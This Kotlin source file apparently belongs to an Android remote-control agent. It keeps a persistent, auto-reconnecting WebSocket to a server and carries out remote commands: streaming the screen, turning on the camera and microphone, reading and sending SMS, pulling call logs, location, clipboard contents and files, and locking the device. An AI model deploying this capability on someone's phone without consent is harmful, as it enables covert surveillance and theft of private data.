package com.kero.remoteagent

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit
import kotlin.math.min

object RemoteConnection {

    private const val TAG = "KERO_REMOTE"

    private val client =
        OkHttpClient.Builder()
            .connectTimeout(
                15,
                TimeUnit.SECONDS
            )
            .readTimeout(
                0,
                TimeUnit.MILLISECONDS
            )
            .pingInterval(
                30,
                TimeUnit.SECONDS
            )
            .build()

    private val mainHandler =
        Handler(
            Looper.getMainLooper()
        )

    private var ws:
        WebSocket? = null

    private var currentRole =
        "agent"

    private var binaryListener:
        ((ByteArray) -> Unit)? = null

    private var textListener:
        ((String) -> Unit)? = null

    private var persistentAgent =
        false

    private var reconnectScheduled =
        false

    private var reconnectDelayMs =
        2000L

    private var agentStatusListener:
        ((String) -> Unit)? = null

    private var agentUiStatusListener:
        ((String) -> Unit)? = null

    private var controllerStatusListener:
        ((String) -> Unit)? = null

    private var lastAgentContext:
        Context? = null

    private var lastAgentUrl =
        ""

    private var lastAgentCode =
        ""

    var mediaProjectionData:
        MediaProjectionData? = null

    data class MediaProjectionData(
        val resultCode: Int,
        val data: Intent
    )

    private val reconnectRunnable =
        Runnable {

            reconnectScheduled =
                false

            if (
                persistentAgent &&
                lastAgentContext != null &&
                lastAgentUrl.isNotBlank() &&
                lastAgentCode.isNotBlank()
            ) {

                connect(
                    lastAgentContext!!,
                    lastAgentUrl,
                    lastAgentCode,
                    "agent",
                    null,
                    null
                )
            }
        }

    // ============================================================
    // Listeners
    // ============================================================

    fun setAgentStatusListener(
        listener: ((String) -> Unit)?
    ) {

        agentStatusListener =
            listener
    }

    fun clearAgentStatusListener() {

        agentStatusListener =
            null
    }

    fun setAgentUiStatusListener(
        listener: ((String) -> Unit)?
    ) {

        agentUiStatusListener =
            listener
    }

    fun clearAgentUiStatusListener() {

        agentUiStatusListener =
            null
    }

    fun setControllerStatusListener(
        listener: ((String) -> Unit)?
    ) {

        controllerStatusListener =
            listener
    }

    fun clearControllerStatusListener() {

        controllerStatusListener =
            null
    }

    // ============================================================
    // Agent
    // ============================================================

    fun startPersistentAgent(
        context: Context,
        serverUrl: String,
        code: String
    ) {

        val app =
            context.applicationContext

        persistentAgent =
            true

        reconnectScheduled =
            false

        reconnectDelayMs =
            2000L

        lastAgentContext =
            app

        lastAgentUrl =
            serverUrl.trim()

        lastAgentCode =
            code.trim()

        AgentPreferences.saveConnection(
            app,
            lastAgentUrl,
            lastAgentCode
        )

        connect(
            app,
            lastAgentUrl,
            lastAgentCode,
            "agent",
            null,
            null
        )
    }

    fun start(
        context: Context,
        serverUrl: String,
        code: String,
        persistentAgent: Boolean = false
    ) {

        if (
            persistentAgent
        ) {

            startPersistentAgent(
                context,
                serverUrl,
                code
            )

        } else {

            this.persistentAgent =
                false

            connect(
                context.applicationContext,
                serverUrl,
                code,
                "agent",
                null,
                null
            )
        }
    }

    // ============================================================
    // Controller
    // ============================================================

    fun startController(
        context: Context,
        serverUrl: String,
        code: String,
        onBinary:
            ((ByteArray) -> Unit)?,
        onText:
            ((String) -> Unit)?
    ) {

        this.persistentAgent =
            false

        connect(
            context.applicationContext,
            serverUrl,
            code,
            "controller",
            onBinary,
            onText
        )
    }

    // ============================================================
    // Device ID
    // ============================================================

    private fun getDeviceId(
        context: Context
    ): String {

        return Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )?.takeIf {
            it.isNotBlank()
        }
            ?: "android-${
                Build.MODEL
                    .replace(
                        " ",
                        "_"
                    )
            }"
    }

    // ============================================================
    // Connection
    // ============================================================

    private fun connect(
        context: Context,
        serverUrl: String,
        code: String,
        role: String,
        onBinary:
            ((ByteArray) -> Unit)?,
        onText:
            ((String) -> Unit)?
    ) {

        if (
            serverUrl.isBlank() ||
            code.isBlank()
        ) {

            publishStatus(
                role,
                "إعداد الاتصال غير مكتمل"
            )

            return
        }

        if (
            !serverUrl.startsWith(
                "ws://"
            ) &&
            !serverUrl.startsWith(
                "wss://"
            )
        ) {

            publishStatus(
                role,
                "رابط السيرفر يجب أن يبدأ بـ ws:// أو wss://"
            )

            return
        }

        ws?.cancel()
        ws = null

        currentRole =
            role

        binaryListener =
            onBinary

        textListener =
            onText

        val httpUrl =
            serverUrl
                .replaceFirst(
                    "ws://",
                    "http://"
                )
                .replaceFirst(
                    "wss://",
                    "https://"
                )

        val encodedCode =
            URLEncoder.encode(
                code,
                "UTF-8"
            )

        val uri =
            if (
                role == "agent"
            ) {

                val deviceId =
                    URLEncoder.encode(
                        getDeviceId(
                            context
                        ),
                        "UTF-8"
                    )

                "$httpUrl/?role=agent" +
                    "&code=$encodedCode" +
                    "&deviceId=$deviceId"

            } else {

                "$httpUrl/?role=controller" +
                    "&code=$encodedCode"
            }

        val request =
            Request.Builder()
                .url(uri)
                .build()

        publishStatus(
            role,
            "جارٍ الاتصال..."
        )

        ws =
            client.newWebSocket(
                request,
                object :
                    WebSocketListener() {

                    override fun onOpen(
                        webSocket: WebSocket,
                        response: Response
                    ) {

                        if (
                            persistentAgent &&
                            role == "agent"
                        ) {

                            reconnectDelayMs =
                                2000L

                            reconnectScheduled =
                                false
                        }

                        publishStatus(
                            role,
                            "متصل بالسيرفر"
                        )

                        ActivityLogger.log(
                            "Connected to server as $role"
                        )

                        Log.d(
                            TAG,
                            "WebSocket OPEN role=$role"
                        )

                        // =================================================
                        // لا يوجد register_device هنا.
                        // السيرفر هو صاحب الاسم والباسورد.
                        // =================================================

                        if (
                            role == "controller"
                        ) {

                            webSocket.send(
                                JSONObject()
                                    .put(
                                        "type",
                                        "get_devices"
                                    )
                                    .toString()
                            )
                        }
                    }

                    override fun onMessage(
                        webSocket: WebSocket,
                        text: String
                    ) {

                        if (
                            role == "agent"
                        ) {

                            handleAgentMessage(
                                webSocket,
                                text
                            )

                        } else {

                            textListener?.invoke(
                                text
                            )
                        }
                    }

                    override fun onMessage(
                        webSocket: WebSocket,
                        bytes: ByteString
                    ) {

                        binaryListener?.invoke(
                            bytes.toByteArray()
                        )
                    }

                    override fun onFailure(
                        webSocket: WebSocket,
                        t: Throwable,
                        response: Response?
                    ) {

                        if (
                            ws === webSocket
                        ) {

                            ws = null
                        }

                        val reason =
                            t.message
                                ?.takeIf {
                                    it.isNotBlank()
                                }
                                ?: "خطأ غير معروف"

                        if (
                            role == "agent"
                        ) {

                            publishStatus(
                                role,
                                "فشل الاتصال، إعادة المحاولة..."
                            )

                            scheduleReconnect()

                        } else {

                            publishStatus(
                                role,
                                "فشل الاتصال: $reason"
                            )
                        }

                        ActivityLogger.log(
                            "Connection failed ($role): $reason"
                        )
                    }

                    override fun onClosed(
                        webSocket: WebSocket,
                        code: Int,
                        reason: String
                    ) {

                        if (
                            ws === webSocket
                        ) {

                            ws = null
                        }

                        ActivityLogger.log(
                            "Connection closed ($role): $code $reason"
                        )

                        if (
                            role == "agent" &&
                            persistentAgent
                        ) {

                            publishStatus(
                                role,
                                "تم قطع الاتصال، إعادة المحاولة..."
                            )

                            scheduleReconnect()

                        } else if (
                            role == "controller"
                        ) {

                            publishStatus(
                                role,
                                "تم قطع الاتصال"
                            )
                        }
                    }
                }
            )
    }

    // ============================================================
    // Status
    // ============================================================

    private fun publishStatus(
        role: String,
        status: String
    ) {

        if (
            role == "agent"
        ) {

            mainHandler.post {

                agentStatusListener
                    ?.invoke(
                        status
                    )

                agentUiStatusListener
                    ?.invoke(
                        status
                    )
            }

        } else {

            mainHandler.post {

                controllerStatusListener
                    ?.invoke(
                        status
                    )

                textListener?.invoke(
                    JSONObject()
                        .put(
                            "type",
                            "connection_status"
                        )
                        .put(
                            "status",
                            status
                        )
                        .put(
                            "connected",
                            status.contains(
                                "متصل"
                            ) ||
                                status.contains(
                                    "Connected"
                                )
                        )
                        .toString()
                )
            }
        }
    }

    // ============================================================
    // Reconnect
    // ============================================================

    private fun scheduleReconnect() {

        if (
            !persistentAgent ||
            reconnectScheduled
        ) {

            return
        }

        reconnectScheduled =
            true

        mainHandler.removeCallbacks(
            reconnectRunnable
        )

        val delay =
            reconnectDelayMs

        reconnectDelayMs =
            min(
                reconnectDelayMs * 2,
                60_000L
            )

        mainHandler.postDelayed(
            reconnectRunnable,
            delay
        )
    }

    // ============================================================
    // Agent commands
    // ============================================================

    fun handleAgentMessage(
        webSocket: WebSocket,
        text: String
    ) {

        try {

            val msg =
                JSONObject(
                    text
                )

            val type =
                msg.optString(
                    "type"
                )

            Log.d(
                TAG,
                "AGENT RECEIVED type=$type device=${msg.optString("deviceId")}"
            )

            when (type) {

                "tap" ->

                    RemoteAccessibilityService
                        .instance
                        ?.tap(
                            msg.optDouble(
                                "x"
                            ),
                            msg.optDouble(
                                "y"
                            )
                        )

                "swipe" ->

                    RemoteAccessibilityService
                        .instance
                        ?.swipe(
                            msg.optDouble(
                                "x1"
                            ),
                            msg.optDouble(
                                "y1"
                            ),
                            msg.optDouble(
                                "x2"
                            ),
                            msg.optDouble(
                                "y2"
                            ),
                            msg.optLong(
                                "duration",
                                450L
                            )
                        )

                "nav" ->

                    RemoteAccessibilityService
                        .instance
                        ?.nav(
                            msg.optString(
                                "action"
                            )
                        )

                "start_screen" ->

                    RemoteAccessibilityService
                        .instance
                        ?.startScreenStreaming()

                "stop_screen" ->

                    RemoteAccessibilityService
                        .instance
                        ?.stopScreenStreaming()

                "camera_start" ->

                    MediaControlService.command(
                        AppContextHolder.context,
                        MediaControlService.ACTION_START_CAMERA_BACK
                    )

                "camera_start_back" ->

                    MediaControlService.command(
                        AppContextHolder.context,
                        MediaControlService.ACTION_START_CAMERA_BACK
                    )

                "camera_start_front" ->

                    MediaControlService.command(
                        AppContextHolder.context,
                        MediaControlService.ACTION_START_CAMERA_FRONT
                    )

                "camera_stop" ->

                    MediaControlService.command(
                        AppContextHolder.context,
                        MediaControlService.ACTION_STOP_CAMERA
                    )

                "camera_switch" ->

                    MediaControlService.command(
                        AppContextHolder.context,
                        MediaControlService.ACTION_SWITCH_CAMERA
                    )

                "mic_start" ->

                    MediaControlService.command(
                        AppContextHolder.context,
                        MediaControlService.ACTION_START_MIC
                    )

                "mic_stop" ->

                    MediaControlService.command(
                        AppContextHolder.context,
                        MediaControlService.ACTION_STOP_MIC
                    )

                // =====================================================
                // WhatsApp
                // =====================================================

                "open_whatsapp" -> {

                    try {

                        val packageManager =
                            AppContextHolder
                                .context
                                .packageManager

                        var whatsappIntent:
                            Intent? = null

                        val packageNames =
                            listOf(
                                "com.whatsapp",
                                "com.whatsapp.w4b"
                            )

                        for (
                            packageName in packageNames
                        ) {

                            val candidate =
                                packageManager
                                    .getLaunchIntentForPackage(
                                        packageName
                                    )

                            if (
                                candidate != null
                            ) {

                                whatsappIntent =
                                    candidate.apply {

                                        addFlags(
                                            Intent.FLAG_ACTIVITY_NEW_TASK
                                        )
                                    }

                                break
                            }
                        }

                        if (
                            whatsappIntent == null
                        ) {

                            sendJson(
                                JSONObject()
                                    .put(
                                        "type",
                                        "whatsapp_error"
                                    )
                                    .put(
                                        "message",
                                        "WhatsApp غير مثبت على الجهاز"
                                    )
                            )

                        } else {

                            AppContextHolder
                                .context
                                .startActivity(
                                    whatsappIntent
                                )

                            sendJson(
                                JSONObject()
                                    .put(
                                        "type",
                                        "whatsapp_opened"
                                    )
                            )
                        }

                    } catch (e: Exception) {

                        sendJson(
                            JSONObject()
                                .put(
                                    "type",
                                    "whatsapp_error"
                                )
                                .put(
                                    "message",
                                    "فشل فتح WhatsApp: ${e.message}"
                                )
                        )
                    }
                }

                // =====================================================
                // معلومات الجهاز
                // =====================================================

                "device_info" ->

                    DeviceAndFileManager
                        .sendDeviceInfo()

                // =====================================================
                // Files
                // =====================================================

                "list_files" ->

                    DeviceAndFileManager
                        .listFiles(
                            msg.optString(
                                "path",
                                "/storage/emulated/0/Download"
                            )
                        )

                "download_file" ->

                    FileTransferManager
                        .downloadFile(
                            msg.optString(
                                "path"
                            )
                        )

                "upload_chunk" ->

                    FileTransferManager
                        .handleUploadChunk(
                            msg
                        )

                // =====================================================
                // Clipboard
                // =====================================================

                "get_clipboard" ->

                    AdvancedInfoProvider
                        .getClipboard()

                "set_clipboard" ->

                    AdvancedInfoProvider
                        .setClipboard(
                            msg.optString(
                                "text"
                            )
                        )

                // =====================================================
                // Battery / Network
                // =====================================================

                "get_battery" ->

                    AdvancedInfoProvider
                        .getBattery()

                "get_network" ->

                    AdvancedInfoProvider
                        .getNetwork()

                // =====================================================
                // Calls
                // =====================================================

                "get_calls" ->

                    AdvancedInfoProvider
                        .getCalls(
                            msg.optInt(
                                "limit",
                                50
                            )
                        )

                // =====================================================
                // Apps
                // =====================================================

                "get_apps" ->

                    AdvancedInfoProvider
                        .getApps(
                            msg.optBoolean(
                                "include_system",
                                false
                            )
                        )

                // =====================================================
                // Location
                // =====================================================

                "get_location" ->

                    AdvancedInfoProvider
                        .getLocation()

                "get_app_usage" ->

                    AppUsageTracker
                        .getAppUsage(
                            msg.optInt(
                                "days",
                                1
                            )
                        )

                // =====================================================
                // App restriction
                // =====================================================

                "restrict_app" ->

                    AppRestrictor
                        .restrictApp(
                            msg.optString(
                                "package"
                            )
                        )

                "unrestrict_app" ->

                    AppRestrictor
                        .unrestrictApp(
                            msg.optString(
                                "package"
                            )
                        )

                "get_restricted_apps" ->

                    AppRestrictor
                        .getRestrictedApps()

                // =====================================================
                // Macros
                // =====================================================

                "run_macro" ->

                    MacroEngine
                        .executeMacro(
                            msg.optString(
                                "macro"
                            )
                        )

                "stop_macro" ->

                    MacroEngine
                        .stopMacro()

                // =====================================================
                // Security
                // =====================================================

                "lock_device" ->

                    SecurityActions
                        .lockDevice()

                "trigger_alarm" ->

                    SecurityActions
                        .triggerAlarm(
                            msg.optLong(
                                "duration",
                                30_000
                            )
                        )

                // =====================================================
                // Logs
                // =====================================================

                "get_logs" ->

                    ActivityLogger
                        .getLogs()

                "clear_logs" ->

                    ActivityLogger
                        .clearLogs()

                // =====================================================
                // SMS
                // =====================================================

                "get_sms" ->

                    SmsManagerHelper
                        .getMessages(
                            msg.optInt(
                                "limit",
                                50
                            )
                        )

                "send_sms" ->

                    SmsManagerHelper
                        .sendMessage(
                            msg.optString(
                                "phone"
                            ),
                            msg.optString(
                                "message"
                            )
                        )

                // =====================================================
                // Dialer
                // =====================================================

                "open_dialer" ->

                    AppLauncher
                        .openDialer(
                            AppContextHolder.context,
                            msg.optString(
                                "phone"
                            )
                        )

                // =====================================================
                // Browser
                // =====================================================

                "open_url" ->

                    AppLauncher
                        .openUrl(
                            AppContextHolder.context,
                            msg.optString(
                                "url"
                            )
                        )

                // =====================================================
                // Recording
                // =====================================================

                "start_recording" -> {

                    val projection =
                        mediaProjectionData

                    if (
                        projection != null
                    ) {

                        ScreenRecorderService
                            .startRecording(
                                AppContextHolder.context,
                                projection.resultCode,
                                projection.data
                            )

                    } else {

                        sendJson(
                            JSONObject()
                                .put(
                                    "type",
                                    "recording_error"
                                )
                                .put(
                                    "message",
                                    "MediaProjection permission is not available."
                                )
                        )
                    }
                }

                "stop_recording" ->

                    ScreenRecorderService
                        .stopRecording(
                            AppContextHolder.context
                        )

                // =====================================================
                // Test
                // =====================================================

                "test" ->

                    sendJson(
                        JSONObject()
                            .put(
                                "type",
                                "test_ok"
                            )
                    )
            }

        } catch (e: Exception) {

            ActivityLogger.log(
                "Agent command error: ${e.message}"
            )
        }
    }

    // ============================================================
    // Send JSON
    // ============================================================

    fun sendJson(
        message: JSONObject
    ): Boolean {

        val socket =
            ws

        val type =
            message.optString(
                "type",
                "unknown"
            )

        val deviceId =
            message.optString(
                "deviceId",
                ""
            )

        if (
            socket == null
        ) {

            Log.e(
                TAG,
                "SEND FAILED: WebSocket is null type=$type device=$deviceId"
            )

            return false
        }

        val json =
            message.toString()

        val result =
            socket.send(
                json
            )

        Log.d(
            TAG,
            "SEND type=$type device=$deviceId result=$result"
        )

        return result
    }

    // ============================================================
    // Send Binary
    // ============================================================

    fun sendBinary(
        data: ByteArray
    ): Boolean {

        return ws?.send(
            ByteString.of(
                *data
            )
        ) == true
    }

    // ============================================================
    // Screenshot
    // ============================================================

    fun sendScreenshot(
        base64Image: String
    ) {

        try {

            ws?.send(
                JSONObject()
                    .put(
                        "type",
                        "screen_frame"
                    )
                    .put(
                        "data",
                        base64Image
                    )
                    .toString()
            )

        } catch (e: Exception) {

            ActivityLogger.log(
                "Screenshot send error: ${e.message}"
            )
        }
    }

    // ============================================================
    // Stop
    // ============================================================

    fun stop() {

        persistentAgent =
            false

        reconnectScheduled =
            false

        mainHandler.removeCallbacks(
            reconnectRunnable
        )

        ws?.close(
            1000,
            "closed"
        )

        ws = null
    }

    fun stopPersistentAgent() {

        stop()
    }
}